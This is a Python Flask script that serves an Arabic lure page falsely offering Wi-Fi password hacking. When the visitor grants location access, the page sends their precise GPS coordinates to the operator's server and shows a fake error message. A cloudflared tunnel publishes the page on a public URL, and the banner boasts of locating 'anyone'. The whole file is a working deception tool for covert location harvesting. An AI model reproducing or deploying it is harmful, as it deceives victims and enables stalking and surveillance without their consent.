import subprocess
import re
from flask import Flask, request
import threading
import time

# ------------------  ORANGE LOGO  ------------------

print("\033[38;5;208m")
print("                   .^~7JY55~^:")
print("                 ~??YB&@@@PG##BP?^")
print("               .J57P&G&@@#B&B&@@@@5:")
print("               ?!Y@&Y#@@GJ&&#@@@@@@#?:")
print("              ~!^&BG&@BGY~55PPB@@@@@G?~")
print("              :.?#5@#JYB: :!~~^!5@@@&?:")
print("               ^&@@#^?P:   :~!~. ^#B5@G^")
print("               !@@@G7Y:    :7G?^  !GJ#@B^")
print("              !#@@@J:7P!    ^~.   ^?Y@@@P.")
print("             :@@@@@5 .:.          !P@@@&?~")
print("             .P@@@@@?    . .      B@@@#?!!")
print("              :&@@@@@J.  !JY57.  ?@@&5~:^^.")
print("               7&@@B5BB7:^7?~. :~7@#?^.")
print("                  5BY^..?~ ...    :!")
print("                      .!~          ?")
print("                     ~7:           J.")
print("                   :?~             ?^")
print("                 .!7.              ?^")
print("             ^  ^7:                ?~")
print("            .?!?~                  !7")
print("          .!Y#P.         :         P5      .:")
print("        ~5BBBB:         ~~        5@@5:    ~^")
print("      !G@BPP@7         !7       :G@@#@&J.  !~")
print("    .5@@BBP&#.        ~J       ~#@@@#B#@B~ .?")
print("   .G@@@@&@@P        :Y       ?&@@B@&YJ&@@? !~")
print("   ?@@@@@@@@B        J^      Y@@@@#@#Y7@@@@Y.?")
print("   5@@@@@@@@@~      :Y      5@@@@@@&#JY&@@@@7?")
print("   J@#&@@@&@@G      ^J     5@@@@@@@@@@@@@@@@G!")
print("   ^&&YB@@#P#@Y     .5    ?@@@@@@@@@@@@@@@@@G.")
print("    ^B@PG###BB@5.    77  ^&@@@@@@@@@@@@@@@@#:")
print("     .?B&@@@@#&@&J~:^~J~ Y@@@@@@@@@@@@@@@@B^")
print("        ^7J5PPPP5Y7~7!!JJ#@@@@@@@@@@@@@@@Y.")
print("                        :!JG#&@@@@@@@&BJ^")
print("                            .:^!J55J!:")
print("\033[0m")

# ---------------------------------------------------

app = Flask(__name__)

# ------------------ HTML PAGE ------------------

html_page = """
<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>GPS Demo</title>

<style>
body {
    margin: 0;
    background: #000;
    color: #fff;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    text-align: center;
}

.container {
    max-width: 600px;
    padding: 20px;
}

h1 {
    font-size: 40px;
    margin-bottom: 20px;
    color: #00ffcc;
}

p {
    font-size: 18px;
    line-height: 1.6;
    color: #ccc;
    margin-bottom: 40px;
}

button {
    padding: 15px 30px;
    font-size: 20px;
    border: none;
    border-radius: 10px;
    background: #222;
    color: white;
    cursor: pointer;
    transition: 0.3s;
}

button:hover {
    background: #00ffcc;
    color: black;
}
</style>
</head>

<body>

<div class="container">
    <h1>اختراق الشبكات الواي فاي</h1>

    <p>
        هاذ الموقع خاص، يمكنك بوساطة هذا الموقع معرفة الشبكات المجاورة وأيضا الكشف عن كلمات المرور بتقنيات
متطورة. يرجى فقط السماح بتحديد الموقع بدقة للحصول على نتائج أفضل
    </p>

    <button onclick="getLocation()">
        اضغط هنا، اختر تحديد الموقع بدقة
    </button>
</div>

<script>
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                fetch('/gps', {
                    method: 'POST',
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude
                    })
                });

                alert("خطأ.. في تهيئة");
                console.log(pos.coords);
            },
            function(err) {
                alert("خطأ.. في تهيئة");
            },
            { enableHighAccuracy: true }
        );
    } else {
        alert("خطأ.. في تهيئة");
    }
}
</script>

</body>
</html>
"""

# ------------------ ROUTES ------------------

@app.route("/")
def index():
    return html_page

@app.route("/gps", methods=["POST"])
def gps():
    data = request.get_json()
    print(f"[GPS] {data}")
    return "OK"

# ------------------ CLOUD FLARED ------------------

def start_cloudflared():
    time.sleep(1)

    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    link_regex = re.compile(r"https://[-A-Za-z0-9.]+\.trycloudflare\.com")

    for line in process.stderr:
        match = link_regex.search(line)
        if match:
            print(f"\n[+] External URL: {match.group(0)}\n")
            break

# ------------------ MAIN ------------------

if __name__ == "__main__":
    print("Developer : Aeltrix")
    print ("My TikTok account : @nyycrypt")
    print("Through satellites you can find out the location of anyone")
    print("Local Server: http://127.0.0.1:5000\n")

    threading.Thread(target=start_cloudflared, daemon=True).start()

    app.run(host="0.0.0.0", port=5000)
    
    
    
